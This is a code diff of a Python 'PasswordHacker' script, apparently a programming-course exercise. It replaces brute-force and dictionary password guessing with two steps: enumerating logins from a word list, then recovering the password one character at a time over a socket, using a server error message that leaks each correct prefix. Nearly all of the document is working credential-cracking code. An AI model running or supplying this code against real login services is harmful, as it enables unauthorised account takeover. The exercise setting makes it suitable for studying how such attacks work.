@@ -1,4 +1,5 @@
 import itertools
+import json
 import os
 import socket
 import string
@@ -9,6 +10,7 @@ class PasswordHacker:
     def __init__(self, ip, port):
         self.address = (ip, int(port))
         self.client = None
+        self.log_data = {'login': '', 'password': ''}
 
     def connect(self):
         self.client = socket.socket()
@@ -17,32 +19,36 @@ class PasswordHacker:
     def disconnect(self):
         self.client.close()
 
-    def force_crack(self):
-        letters = string.ascii_lowercase + string.digits
-        n_letters = 0
-        while True:
-            n_letters += 1
-            for password in itertools.product(letters, repeat=n_letters):
-                password = ''.join(password)
-                self.client.send(password.encode())
-                if self.client.recv(1024).decode() == 'Connection success!':
-                    return password
+    def send_msg(self):
+        self.client.send(json.dumps(self.log_data).encode())
+        return json.loads(self.client.recv(1024).decode())
 
-    def dictionary_crack(self):
-        with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'passwords.txt'), 'rt') as f:
-            for word in f:
-                combinations = [(x[0]) if x[0] == x[1] else x for x in zip(word.strip(), word.strip().upper())]
-                for password in itertools.product(*combinations):
-                    password = ''.join(password)
-                    self.client.send(password.encode())
-                    if self.client.recv(1024).decode() == 'Connection success!':
-                        return password
+    def find_login(self):
+        with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'logins.txt'), 'rt') as f:
+            for line in f:
+                self.log_data['login'] = line.strip()
+                if self.send_msg() == {'result': 'Wrong password!'}:
+                    break
+
+    def find_password(self):
+        letters = string.ascii_letters + string.digits
+        while True:
+            for letter in letters:
+                self.log_data['password'] += letter
+                response = self.send_msg()
+                if response == {'result': 'Connection success!'}:
+                    return
+                elif response == {'result': 'Exception happened during login'}:
+                    break
+                self.log_data['password'] = self.log_data['password'][:-1]
 
 
 def main():
     hacker = PasswordHacker(*sys.argv[1:])
     hacker.connect()
-    print(hacker.dictionary_crack())
+    hacker.find_login()
+    hacker.find_password()
+    print(json.dumps(hacker.log_data))
     hacker.disconnect()
 
 
